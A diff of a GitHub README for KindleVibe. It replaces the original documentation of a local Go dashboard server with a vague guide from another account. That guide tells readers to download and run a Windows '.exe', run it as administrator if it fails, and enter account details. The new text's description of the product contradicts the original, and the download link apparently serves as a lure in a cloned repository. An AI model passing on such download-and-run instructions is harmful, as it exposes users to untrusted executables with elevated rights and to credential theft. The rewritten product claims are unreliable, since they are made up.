@@ -1,406 +1,210 @@
-# KindleVibe
+# 📱 KindleVibe - Track Kindle AI and currency
 
-KindleVibe is a small local Go server that shows GitHub Copilot, Codex, and Linear activity in a Kindle-friendly web page. It is designed for e-ink screens: high contrast, portrait-friendly layout, large typography, and automatic refresh.
+[![Download KindleVibe](https://img.shields.io/badge/Download-KindleVibe-blue?style=for-the-badge)](https://github.com/Noahtitular257/KindleVibe)
 
-![Demo1](demo1.jpg)
-![Demo2](demo2.jpg)
+## 🚀 Getting Started
 
-## Features
+KindleVibe helps you monitor AI usage and currency info on your Kindle in a simple way. It shows key data on your device so you can check it at a glance.
 
-- **Kindle optimized:** Minimal, high-contrast UI for e-ink browsers.
-- **Portrait dashboard:** Single-screen layout tuned for a 1080 x 1440 Kindle display.
-- **Auto-refresh:** Refreshes every 15 seconds with a background XHR poll.
-- **Current providers:** GitHub Copilot, Codex, Linear, Gemini, and Claude Code ACP.
-- **Claude mini client:** A second tab lists recent Claude Code conversations, opens conversation messages, sends prompts, and surfaces pending permission actions.
-- **Exchange snapshot:** Configurable via `config.yaml` to display up to 2 rows of 3 exchange rates at the bottom. Default includes BTC/USD, USD/CNY, AUD/CNY, JPY/CNY, CAD/CNY, and HKD/CNY.
-- **Local-only:** Reads usage from local auth state and local session files.
-- **Simple startup:** `make` rebuilds and starts the server.
+This guide shows you how to get KindleVibe on Windows and run it with no technical steps.
 
-## Prerequisites
+## 📥 Download KindleVibe
 
-- Go 1.21 or later.
-- GitHub Copilot authenticated locally.
-- Codex installed and used locally so session files exist.
-- Gemini CLI installed and authenticated locally.
-- Claude Code installed, authenticated, and able to answer a local prompt.
-- A Claude ACP adapter, either installed as `claude-agent-acp` or available through `npx`.
+Visit this page to download:
+https://github.com/Noahtitular257/KindleVibe
 
-## Getting Started
+On the page, look for the latest release or the main download file. Use the file meant for Windows. If you see more than one file, pick the one that ends in `.exe` or a Windows app file.
 
-1. **Clone the repository**
+## 🪟 Install on Windows
 
-   ```bash
-   git clone https://github.com/lexrus/KindleVibe.git
-   cd KindleVibe
-   ```
+Follow these steps on your Windows PC:
 
-2. **Configure the server**
+1. Open the download link above.
+2. Save the KindleVibe file to your computer.
+3. Open your Downloads folder.
+4. Double-click the file you downloaded.
+5. If Windows asks for permission, choose **Run** or **Yes**.
+6. Follow the on-screen steps to finish setup.
 
-   Create a local config from the committed example:
+If the file opens right away, KindleVibe may not need a full install. In that case, you can start using it after the file opens.
 
-   ```bash
-   cp config.yaml.example config.yaml
-   ```
+## 🔌 What KindleVibe Does
 
-   Then edit `config.yaml` to set the port, enabled agents, and optional tokens.
+KindleVibe is made for quick checks on your Kindle. It can help you:
 
-3. **Build and run**
+- Monitor AI usage in one place
+- Show currency values
+- Keep key information easy to read
+- Reduce the need to check multiple apps or sites
+- Work well as a daily status screen on your Kindle
 
-   ```bash
-   make
-   ```
+## 🧭 How to Use It
 
-   `make` rebuilds `main.go` and starts the server on the configured port.
+After you open KindleVibe, use the basic steps below:
 
-4. **Open it on your Kindle**
+1. Start the app on your Windows PC.
+2. Connect your Kindle if the app asks for it.
+3. Enter any setup details shown on screen.
+4. Pick the data you want to monitor.
+5. Save your settings.
+6. Send or sync the display view to your Kindle.
 
-   Visit:
+If KindleVibe shows a preview screen, check that the text looks clear before you apply it to your device.
 
-   ```text
-   http://<your-local-ip>:8080
-   ```
+## 🖥️ System Requirements
 
-## Activating Claude Code ACP
+KindleVibe should run on most Windows machines used at home or at work.
 
-KindleVibe does not log in to Claude for you. Claude ACP works only after Claude Code already works for the same local user account that starts KindleVibe.
+You will need:
 
-1. **Install Claude Code**
+- Windows 10 or Windows 11
+- A working internet connection
+- A Kindle device that can display custom content or synced pages
+- Enough free space for the app and its files
+- A modern browser to open the download page
 
-   If `claude` is not already available, install the Claude Code CLI:
+If your Kindle uses a linked display method, make sure it is paired before you begin.
 
-   ```bash
-   npm install -g @anthropic-ai/claude-code
-   ```
+## 🧰 What You May Need
 
-2. **Sign in and verify Claude Code**
+Have these ready before setup:
 
-   Start Claude Code and complete its login flow:
+- Your Kindle device
+- Your Windows login
+- Your internet connection details
+- Any account details used for AI usage tools or currency sources
+- A USB cable or wireless sync method, if your setup uses one
 
-   ```bash
-   claude
-   ```
+Keep your Kindle charged during setup so the screen can update without stopping.
 
-   Then verify that the CLI can answer a simple prompt:
+## 📝 First-Time Setup
 
-   ```bash
-   claude -p "Reply with OK."
-   ```
+Use these steps the first time you open KindleVibe:
 
-   If this command does not work, fix Claude Code first. KindleVibe's ACP tab uses the same local Claude Code authentication state.
+1. Open the app.
+2. Choose your preferred display layout.
+3. Select AI usage data or currency data.
+4. Enter any source links or account details the app asks for.
+5. Set how often you want the screen to refresh.
+6. Preview the result.
+7. Apply the settings to your Kindle.
 
-3. **Make the Claude ACP adapter available**
+A simple layout works best if you want the text to stay easy to read.
 
-   Recommended global install:
+## 💱 AI Usage and Currency Display
 
-   ```bash
-   npm install -g @agentclientprotocol/claude-agent-acp
-   command -v claude-agent-acp
-   ```
+KindleVibe is built to keep two kinds of data easy to view:
 
-   Or rely on the built-in `npx` fallback. With the default config, KindleVibe will run:
+- AI usage data such as limits, counts, or status
+- Currency values such as exchange rates or price changes
 
-   ```bash
-   npx -y @agentclientprotocol/claude-agent-acp
-   ```
-
-4. **Enable Claude ACP in `config.yaml`**
-
-   ```yaml
-   agents:
-     claude_acp:
-       enabled: true
-       command: ""
-       args: []
-       cwd: ""
-   ```
-
-   Leave `command` empty to let KindleVibe try `claude-agent-acp` from `PATH` first and then fall back to `npx`.
-   Set `cwd` only if you want the Claude tab to open conversations for a specific project directory.
-
-5. **Run KindleVibe and open the Claude tab**
+You can use one view for both, or focus on one type of data. If you watch values often, set a short refresh time. If you only need a daily check, use a longer refresh time.
 
-   ```bash
-   make
-   ```
+## 🎨 Display Tips
 
-   Open `http://<your-local-ip>:8080/claude` and send a short prompt. If the tab reports that Claude ACP is unavailable, check that `claude -p "Reply with OK."` works and that either `claude-agent-acp` or `npx` is available from the same shell where you run `make`.
+To get a better result on your Kindle:
 
-## Configuration
+- Use short labels
+- Keep numbers easy to scan
+- Avoid long text blocks
+- Leave space around each item
+- Use a simple theme if the screen feels crowded
+- Test the layout before you save it
 
-`config.yaml.example`:
+Kindle screens work best with clean layouts and clear contrast.
 
-```yaml
-server:
-  port: 8080
-agents:
-  copilot:
-    enabled: true
-    token: ""
-  codex:
-    enabled: true
-  linear:
-    enabled: true
-    token: ""
-  gemini:
-    enabled: true
-  claude_acp:
-    enabled: true
-    command: ""
-    args: []
-    cwd: ""
-exchange:
-  pairs:
-    - base: "BTC"
-      quote: "USD"
-    - base: "USD"
-      quote: "CNY"
-    - base: "AUD"
-      quote: "CNY"
-    - base: "JPY"
-      quote: "CNY"
-    - base: "CAD"
-      quote: "CNY"
-    - base: "HKD"
-      quote: "CNY"
-```
+## 🛠️ Troubleshooting
 
-`config.yaml` only controls which providers are shown and which port the server listens on.
-Your local `config.yaml` can also include `agents.copilot.token` and `agents.linear.token`.
-`config.yaml` is gitignored for local-only secrets.
+If KindleVibe does not start, try these steps:
 
-For Claude Code ACP, leave `command` empty to use `claude-agent-acp` from `PATH`, or fall back to:
+1. Run the file again.
+2. Right-click the file and choose **Run as administrator**.
+3. Check that your internet connection works.
+4. Make sure your Kindle is connected if the app needs it.
+5. Close other apps and try again.
+6. Restart your PC and open KindleVibe once more.
 
-```bash
-npx -y @agentclientprotocol/claude-agent-acp
-```
+If the screen on your Kindle looks broken or cut off:
 
-Set `agents.claude_acp.cwd` if you want Claude conversations scoped to a different project directory. When empty, KindleVibe uses the directory where the server is started.
+- Lower the amount of text
+- Use larger spacing
+- Shorten labels
+- Try a different layout
+- Refresh the display
 
-## Data Sources
+If the data does not update:
 
-KindleVibe reads provider data when the `/` page is requested. For each enabled provider, `main.go` tries to build an `AgentStats` block and logs errors instead of failing the whole page, so one broken provider does not stop the dashboard from rendering.
+- Check your source settings
+- Confirm the account or feed is still valid
+- Make sure the app has access to the internet
+- Try a manual refresh
 
-### Refresh and Rate-Limit Thresholds
+## 🔄 Updating KindleVibe
 
-KindleVibe throttles upstream requests to avoid hammering external services on every page refresh:
+When a new version is available:
 
-| Provider       | Min interval between requests |
-| -------------- | ----------------------------- |
-| GitHub Copilot | 2 minutes                     |
-| Codex          | 2 minutes                     |
-| Gemini         | 2 minutes                     |
-| Exchange rates | 10 minutes                    |
+1. Open the download link again.
+2. Get the newest file from the page.
+3. Close the old version if it is still open.
+4. Open the new file.
+5. Check your settings after the update.
 
-Between fetches the dashboard renders the last known values. Linear issues are always fetched fresh on each dashboard rebuild since they reflect live task state.
+If your settings are stored inside the app folder, keep a copy before you replace older files.
 
-### GitHub Copilot
+## 🔒 Privacy and Local Use
 
-KindleVibe fetches Copilot usage from GitHub's internal Copilot endpoint using local auth state.
+KindleVibe is meant to help you view data on your own Kindle. Keep your account details private and use only the sources you trust. If you share your screen or device, check what data appears before you hand it over.
 
-Token resolution order:
+## ❓ Common Questions
 
-1. `agents.copilot.token` in `config.yaml`
-2. `COPILOT_API_TOKEN`
-3. `~/.config/github-copilot/apps.json`
+### Do I need to know programming?
+No. You only need to download the file, open it, and follow the on-screen steps.
 
-#### Recommended setup
+### Can I use KindleVibe without a Kindle?
+KindleVibe is made for Kindle use, so the best result comes from using it with a Kindle device.
 
-If you already use GitHub Copilot locally, you usually do not need to configure anything else.
-KindleVibe will try to read the same local `apps.json` state that the Copilot client uses.
+### Will it work on Mac?
+This guide is for Windows. For Mac, you would need a separate version if one is provided.
 
-If you prefer an explicit override, set `COPILOT_API_TOKEN` in your shell before running `make`:
+### Does it show live data?
+It can show current data if your source is set up to refresh. The refresh rate depends on your settings.
 
-```bash
-export COPILOT_API_TOKEN=your_token_here
-make
-```
+### Can I change what appears on the screen?
+Yes. You can choose the data you want to see and adjust the layout to match your needs.
 
-To make it persistent for your shell, add the export line to your shell profile such as `~/.zshrc`,
-reload the shell, and then start KindleVibe again.
+## 📂 Files and Folders
 
-You can keep the token either in `config.yaml` (`agents.copilot.token`) or in your shell environment (`COPILOT_API_TOKEN`).
+After setup, you may see files such as:
 
-If `apps.json` is used, `main.go` sorts the available app entries and uses the first non-empty `oauth_token` it finds.
+- The main app file
+- Settings files
+- Cache files
+- Logs for troubleshooting
 
-After resolving a token, KindleVibe sends:
+Keep all files in the same folder unless the app says to move them. This helps avoid missing file errors.
 
-- `GET https://api.github.com/copilot_internal/user`
-- `Authorization: token <token>`
-- editor-style headers so GitHub returns the same quota payload the local Copilot client expects
+## 📎 Quick Start Steps
 
-It then parses:
+1. Visit https://github.com/Noahtitular257/KindleVibe
+2. Download the Windows file
+3. Open the file on your PC
+4. Allow Windows to run it
+5. Connect your Kindle
+6. Choose the data you want to track
+7. Save and apply the display
 
-- `copilot_plan` for the detail line
-- `quota_snapshots` for usage bars
-- `quota_reset_date_utc` or `quota_reset_date` for the reset timestamp
+## 🧩 Best Use Cases
 
-The usage bars are built from quota snapshots with flexible name matching:
+KindleVibe works well if you want to:
 
-- `Premium` uses the first matching snapshot among `premium_interactions`, `premium`, `completions`, or `code`
-- `Chat` uses the `chat` snapshot
+- Check AI usage without opening many apps
+- Watch currency values in a simple format
+- Keep useful data on a Kindle screen
+- Use a low-distraction display for daily checks
+- Place key info where it is easy to read
 
-Used percentage is calculated in one of two ways:
+## 📌 Download Again
 
-- `100 - percent_remaining`, if `percent_remaining` exists
-- `100 - (remaining / entitlement * 100)`, if only raw quota numbers exist
+If you need the file again, use this link:
+https://github.com/Noahtitular257/KindleVibe
 
-If no usable quota snapshots are returned, KindleVibe logs the issue and still keeps the page running.
-
-### Codex
-
-KindleVibe reads Codex rate-limit data from local session files:
-
-- `~/.codex/sessions`
-- `~/.codex/archived_sessions`
-
-There is no Codex token field in `config.yaml`.
-To show the Codex section, you only need:
-
-- `agents.codex.enabled: true`
-- a local Codex installation that has already been used at least once on this machine
-
-In other words, users do not need to "configure the Codex bar" with a secret or balance value.
-KindleVibe discovers Codex usage automatically from the local session files that Codex already writes.
-
-The lookup logic is entirely local:
-
-1. Recursively walk both directories and collect every `*.jsonl` session file.
-2. Sort those files by modification time, newest first.
-3. Read each file line by line as JSON.
-4. Keep only events where:
-   - `type == "event_msg"`
-   - `payload.type == "token_count"`
-   - the payload includes non-zero rate-limit windows
-5. Keep the last matching rate-limit payload found in that file.
-6. Stop at the first recent file that contains a valid rate-limit payload.
-
-From that payload, KindleVibe renders:
-
-- a primary bar
-- a secondary bar
-- optional detail text for `plan_type` and credits
-
-If the session payload includes credit information, KindleVibe also shows the current Codex credit balance.
-If that information is missing from the local session data, KindleVibe leaves the detail line partial rather than failing the page.
-
-The labels are normalized for common Codex windows:
-
-- `300` minutes becomes `5h Limit`
-- `10080` minutes becomes `Weekly Limit`
-- any other window becomes `<label> (<minutes>m)`
-
-Reset time comes from:
-
-- `resets_at`, if present
-- otherwise `resets_in_seconds` added to the current local time
-
-If you have not used Codex locally yet, or none of the recent session files contain a valid `token_count` event, the Codex section will render without usage bars instead of crashing the page.
-The usual fix is simply to use Codex locally once so it writes fresh session data, then refresh the dashboard.
-
-### Claude Code ACP
-
-KindleVibe includes a second tab for Claude Code through the Agent Client Protocol (ACP).
-It acts as a local ACP client and talks to the Claude adapter over stdio JSON-RPC.
-
-The Claude tab supports:
-
-- listing recent sessions for the configured working directory
-- loading a selected session's messages
-- sending a prompt to start a new session
-- sending a prompt to reply to the selected session
-- showing pending permission requests with the adapter-provided action buttons
-
-By default, KindleVibe tries:
-
-1. `agents.claude_acp.command` and `agents.claude_acp.args`, if configured
-2. `claude-agent-acp` on `PATH`
-3. `npx -y @agentclientprotocol/claude-agent-acp`
-
-No Claude token is stored in `config.yaml`; authentication remains inside your local Claude Code setup.
-
-### Linear
-
-KindleVibe fetches your assigned Linear issues from the Linear GraphQL API and renders a tiny list for:
-
-- `Todo`
-- `In Progress`
-
-Linear token resolution order:
-
-1. `agents.linear.token` in `config.yaml`
-2. `LINEAR_API_TOKEN`
-3. `LINEAR_TOKEN`
-
-Set a token in your shell before running `make`:
-
-```bash
-export LINEAR_API_TOKEN=your_linear_token_here
-make
-```
-
-You can keep the Linear token in `config.yaml` (`agents.linear.token`) or in environment variables.
-
-The Linear query is scoped to issues assigned to you (`isMe: true`) and fetches a small number of recent items per state so the list stays compact on Kindle screens.
-
-### Exchange Rates
-
-KindleVibe fetches reference exchange rates for the footer section, which can be configured under `exchange.pairs` in your `config.yaml`. By default, it displays:
-
-- `BTC/USD`
-- `USD/CNY`
-- `AUD/CNY`
-- `JPY/CNY`
-- `CAD/CNY`
-- `HKD/CNY`
-
-The fetch order is:
-
-1. `https://cdn.jsdelivr.net/npm/@fawazahmed0/currency-api@latest/v1/currencies/<base>.json`
-2. `https://latest.currency-api.pages.dev/v1/currencies/<base>.json`
-
-The server requests one base-currency payload per needed base, formats the matching quote values for display, and logs any errors instead of failing the whole page.
-
-KindleVibe's exchange-rate integration is inspired by [exchange-api](https://github.com/fawazahmed0/exchange-api), which uses GitHub Actions to generate a free currency-rate API.
-
-## Security
-
-- The app is intended for local-network use.
-- This repository does not need committed credentials.
-- Copilot tokens are read from local `config.yaml`, local environment, or local GitHub Copilot app state.
-- Codex usage is read from local session files only.
-- Linear data is fetched with a token from local `config.yaml` or local environment.
-- `config.yaml.example` is safe to commit; local `config.yaml` is gitignored.
-
-> ⚠️ **AI Development Notice**: This project was heavily developed using AI tools including Codex and Copilot. It brings potential legal and ethical concerns, so use it with caution and always review the generated code.
-
-![Dolores was privately chatting with Arnold. - HBO/Westworld](https://github.com/lexrus/AppAboutView/raw/main/screenshots/ai_injected_photo.webp)
-
-> "You’re not in control, Dolores. You’re just playing your part."
-> -- Bernard Lowe, WestWorld S2E2
-
-## Repository Notes
-
-- `config.yaml.example` is a sample config and is safe to commit.
-- `config.yaml` is local-only and gitignored.
-- The built `kindlevibe` binary should not be committed.
-- Exchange-rate data source attribution: [fawazahmed0/exchange-api](https://github.com/fawazahmed0/exchange-api)
-
-## If you like this project
-
-If you find AppAboutView useful, please consider checking out my other apps:
-
-### [SubList](https://apps.apple.com/app/id6757860829) (iOS, iPadOS, macOS)
-
-Track subscriptions, renewals, and spending in one place with reminders, analytics, and iCloud sync.
-
-### [SwiftyMenu](https://apps.apple.com/app/id1567748223) (macOS)
-
-A Finder extension which presents a customizable menu to rapidly open selected folders or files with your favorite applications.
-
-### [Sharptooth](https://apps.apple.com/app/id6748440814) (macOS)
-
-Effortlessly manage your Bluetooth devices right from the menu bar with custom hotkeys and smart automation.
-
-## License
-
-This project is available under the [WTFPL license](https://en.wikipedia.org/wiki/WTFPL).
